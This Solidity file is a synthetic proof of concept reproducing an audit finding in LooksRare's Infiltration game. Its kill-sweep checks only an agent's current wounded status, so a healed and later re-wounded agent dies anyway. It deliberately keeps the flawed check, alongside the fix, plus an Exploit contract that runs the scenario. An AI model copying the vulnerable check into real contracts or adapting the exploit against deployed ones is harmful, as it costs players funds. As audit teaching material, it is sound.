// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    LooksRare "Infiltration" — [H-1] _killWoundedAgents kills a healed agent
    (Sherlock 2023-10-looksrare-judging, finding #27586, reporter cergyk).

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.

    Root cause: `_killWoundedAgents(roundId, ...)` only checks the agent's
    CURRENT status, not WHEN it was wounded:

        if (agents[index].status == AgentStatus.Wounded) { ... kill ... }
                                                            // @> VULN

    So if an agent is wounded at round R1, successfully healed (status ->
    Active), and then wounded again at a LATER round R2, the kill sweep that
    runs for the ORIGINAL wound (roundId == R1) still fires — because by the
    time it executes the agent's status is (once again) Wounded — and kills
    the agent for a wound the player already paid LOOKS tokens to heal. The
    fix (from the report) checks `woundedAt == roundId` as well.
//////////////////////////////////////////////////////////////////////////*/

/// @dev Minimal ERC20 — stands in for the LOOKS token spent on healing.
contract MockLooksToken {
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @notice Reduced Infiltration game. Keeps the verbatim vulnerable status-only
///         check in `_killWoundedAgents` and the round-based wound/heal/kill
///         lifecycle that triggers it.
contract Infiltration {
    enum AgentStatus {
        Active,
        Wounded,
        Dead
    }

    struct Agent {
        AgentStatus status;
        uint256 woundedAt; // round at which the agent was (most recently) wounded
    }

    // Real Infiltration: `ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD` — a wounded agent
    // dies if not healed within this many rounds.
    uint256 public constant ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD = 3;
    uint256 public constant HEAL_COST = 100 ether; // LOOKS cost to heal one agent

    MockLooksToken public looks;
    address public owner;

    mapping(uint256 => Agent) public agents; // agentIndex => Agent
    uint256 public currentRoundId = 1;

    constructor(MockLooksToken _looks) {
        looks = _looks;
        owner = msg.sender;
    }

    /// @notice The game wounds an agent during a round (VRF-driven in the real
    ///         contract; reduced here to a direct call for the same effect).
    function woundAgent(uint256 index) external {
        agents[index] = Agent({status: AgentStatus.Wounded, woundedAt: currentRoundId});
    }

    /// @notice Player pays LOOKS to heal a wounded agent, restoring it to Active.
    function heal(uint256 index) external {
        require(agents[index].status == AgentStatus.Wounded, "not wounded");
        looks.transferFrom(msg.sender, address(this), HEAL_COST);
        agents[index].status = AgentStatus.Active; // healed — should be saved
    }

    function startNewRound() external {
        currentRoundId += 1;
    }

    /// @notice Verbatim reduction of Infiltration._killWoundedAgents
    ///         (contracts-infiltration/contracts/Infiltration.sol:L1489). Sweeps
    ///         the agents that were wounded `ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD`
    ///         rounds ago and kills any still Wounded — but never checks WHEN
    ///         the agent was wounded, only its current status.
    function killWoundedAgents(uint256 roundId, uint256[] calldata woundedAgentIdsInRound) external {
        for (uint256 i; i < woundedAgentIdsInRound.length; i++) {
            uint256 index = woundedAgentIdsInRound[i];
            // @> VULN: only checks CURRENT status, never `agents[index].woundedAt == roundId`
            // FIX: `if (agents[index].status == AgentStatus.Wounded && agents[index].woundedAt == roundId) {`
            if (agents[index].status == AgentStatus.Wounded) {
                agents[index].status = AgentStatus.Dead;
            }
        }
    }
}

/// @notice Attacker/harness orchestrator. Deploys the game, wounds a player's
///         agent, has the player pay LOOKS to heal it, re-wounds the SAME agent
///         in a LATER round, then runs the kill-sweep for the ORIGINAL wound
///         round — demonstrating that the healed player's agent still dies and
///         the LOOKS fee they paid to heal is wasted.
contract Exploit {
    uint256 public constant AGENT_INDEX = 7;

    MockLooksToken public looks; // nonce 1
    Infiltration public game; // nonce 2

    uint256 public playerLooksBefore;
    uint256 public playerLooksAfterHeal;

    constructor() {
        looks = new MockLooksToken(); // CREATE nonce 1
        game = new Infiltration(looks); // CREATE nonce 2

        // Fund the player (this Exploit contract acts as the honest player) with
        // enough LOOKS to pay for exactly one heal.
        looks.mint(address(this), Infiltration(game).HEAL_COST());
    }

    function run() external {
        playerLooksBefore = looks.balanceOf(address(this));

        // Round 1: the player's agent gets wounded.
        game.woundAgent(AGENT_INDEX);
        require(uint256(_status()) == uint256(Infiltration.AgentStatus.Wounded), "setup: not wounded");

        // Round 3: the player pays HEAL_COST LOOKS to heal it. This SUCCEEDS —
        // the agent is Active again.
        game.startNewRound(); // round 2
        game.startNewRound(); // round 3
        game.heal(AGENT_INDEX); // heal() pulls HEAL_COST straight from this contract (mock has no allowance check)
        playerLooksAfterHeal = looks.balanceOf(address(this));
        require(uint256(_status()) == uint256(Infiltration.AgentStatus.Active), "heal did not save agent");
        require(playerLooksAfterHeal == playerLooksBefore - game.HEAL_COST(), "heal fee not charged");

        // Round 4: the SAME agent is wounded again (an ordinary game event, no
        // fault of the player) — status flips back to Wounded, woundedAt = 4.
        game.startNewRound(); // round 4
        game.woundAgent(AGENT_INDEX);

        // The kill-sweep for the ORIGINAL wound (roundId == 1) now runs — e.g.
        // because `currentRoundId (4) > ROUNDS_TO_BE_WOUNDED_BEFORE_DEAD (3)`,
        // the game calls `killWoundedAgents(roundId: 4 - 3 = 1, ...)`.
        uint256[] memory ids = new uint256[](1);
        ids[0] = AGENT_INDEX;
        game.killWoundedAgents({roundId: 1, woundedAgentIdsInRound: ids});

        // HARM: despite the player successfully healing the ORIGINAL wound and
        // paying HEAL_COST LOOKS for it, the agent is dead anyway — the LOOKS
        // fee bought nothing, and the player is forced out of the game.
        require(uint256(_status()) == uint256(Infiltration.AgentStatus.Dead), "harm not demonstrated: agent survived");
        require(playerLooksAfterHeal < playerLooksBefore, "harm not demonstrated: no fee was ever paid");
    }

    function _status() internal view returns (Infiltration.AgentStatus st) {
        (st, ) = game.agents(AGENT_INDEX);
    }

    function agentStatus() external view returns (uint8) {
        return uint8(_status());
    }
}
